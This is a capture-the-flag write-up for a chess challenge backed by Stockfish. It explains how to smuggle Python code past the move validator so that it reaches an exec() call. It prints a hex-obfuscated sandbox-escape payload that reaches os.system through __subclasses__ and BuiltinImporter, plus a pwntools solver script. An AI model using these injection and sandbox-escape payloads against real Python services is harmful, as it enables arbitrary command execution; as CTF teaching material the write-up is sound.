# Writeup 

We need to reach the ```exec(result)``` statement in the code but you can only reach there when you survive atleast 50 moves, after which all of our moves get executed.
### Part one: Wrong move but correct input.

```py
user_move = ""
        while user_move == "":
            user_move = input("Your move: ").strip()
            if user_move:
                all_moves.append(user_move)
                stockfish.make_moves_from_current_position([user_move])
                print(stockfish.get_board_visual())
            else:
                print("Error: Empty input. Please enter a valid move.")
```

In this part of the code, to play chess the moves has been made with the help of ```stockfish.make_moves_from_current_position()``` which takes a list input. So we are allowed to input multiple moves. But we must inject code not moves. If we take a look at ```stockfish.make_moves_from_current_position()``` function,

```py
def make_moves_from_current_position(self, moves: Optional[List[str]]) -> None:
        """Sets a new position by playing the moves from the current position.

        Args:
            moves:
              A list of moves to play in the current position, in order to reach a new position.
              Must be in full algebraic notation.
              Example: ["g4d7", "a8b8", "f1d1"]
        """
        if not moves:
            return
        self._prepare_for_new_position(False)
        for move in moves:
            if not self.is_move_correct(move):
                raise ValueError(f"Cannot make move: {move}")
            self._put(f"position fen {self.get_fen_position()} moves {move}")
```
Something really weird is happening, if we put move as ```anything <valid move> anything```, the valid move we make does get acknowledged to be correct but no Error thrown for anything before and after, also the valid move doesn't get played !? which means we can put ```code ; <valid move> ;``` . 

Something to note here is, the way the input is taken and sent to make_moves_from_current_position() is not correct way of doing if accounting for unintentional multiple moves as instead of the list being sent ```[ 'code', ';', '<valid move>', ';' ]``` which will indeed raise ValueError, the list sent is ```[ 'code ; <valid move> ; ']``` that does not raise any errors but doesn't play ```<valid move>``` either , while list ```[' <valid move> <valid move> <valid move> ']``` does not raise ValueError but does play all the ```<valid moves>``` too!

### Part two : Payload

Even when we know how to put code, we must play least 50 moves, thankfully when our move is ignored, stockfish just plays against itself, and it plays the same move sequence everytime. Going through that game once, ```a2a3``` stays a valid move input till count reaches 62 except at count = 46 , which is a Queen check and valid move is ```g1h1``` or ```g1h2```. 

So we'll put payload at the very first move and garbage later, as long as all inputs have the valid move.

```
getattr(getattr(getattr(getattr(getattr(bytearray().decode(), bytearray([0x5f,0x5f,0x63,0x6c,0x61,0x73,0x73,0x5f,0x5f]).decode()), bytearray([0x5f,0x5f,0x6d,0x72,0x6f,0x5f,0x5f]).decode())[1], bytearray([0x5f,0x5f,0x73,0x75,0x62,0x63,0x6c,0x61,0x73,0x73,0x65,0x73,0x5f,0x5f]).decode())()[84], bytearray([0x6c,0x6f,0x61,0x64,0x5f,0x6d,0x6f,0x64,0x75,0x6c,0x65]).decode())(bytearray([0x6f,0x73]).decode()),bytearray([0x73,0x79,0x73,0x74,0x65,0x6d]).decode())(bytearray([0x63,0x61,0x74,0x20,0x66,0x6c,0x61,0x67,0x2e,0x74,0x78,0x74]).decode())
```
this payload which is to skip over  ' character is , using ```_frozen_importlib.BuiltinImporter``` is this: 
```
getattr(getattr(getattr(getattr(getattr(bytearray().decode(), '__class__'),'__mro__')[1],'__subclasses__')()[84], 'load_module')('os'),'system')('cat flag.txt')
```

You can get the ```[84]``` index for ```_frozen_importlib.BuiltinImporter``` , by :
```
print(getattr(getattr(getattr(bytearray().decode(), '__class__'),'__mro__')[1],'__subclasses__')())
```
which is
```
print(getattr(getattr(getattr(bytearray().decode(), bytearray([0x5f,0x5f,0x63,0x6c,0x61,0x73,0x73,0x5f,0x5f]).decode()), bytearray([0x5f,0x5f,0x6d,0x72,0x6f,0x5f,0x5f]).decode())[1], bytearray([0x5f,0x5f,0x73,0x75,0x62,0x63,0x6c,0x61,0x73,0x73,0x65,0x73,0x5f,0x5f]).decode())())
```
<hr>

Here is the ```sol.py``` that uses above two realisations and gets the flag. 

```py
from pwn import *

payload = input("Enter payload:")
payload += " ; a2a3 ;"

n = 33
input_list = []

for i in range(n):
    move = "x ; a2a3 ;"
    input_list.append(move)
input_list[0] = payload
input_list[23] = "x ; g1h2 ;"
print(input_list)

chal_host = "127.0.0.1" #insert here
chal_port = 39641 

p = remote(chal_host, chal_port)

for user_input in input_list:
    p.sendline(user_input)
output=p.recvall(timeout=2).strip()
print(output.decode())

print("Done")

```


<hr>

## Flag: nite{4nd_th3n_h3_s4cr1f1c135_th3_ROO00000000000KKKKK!!!!}
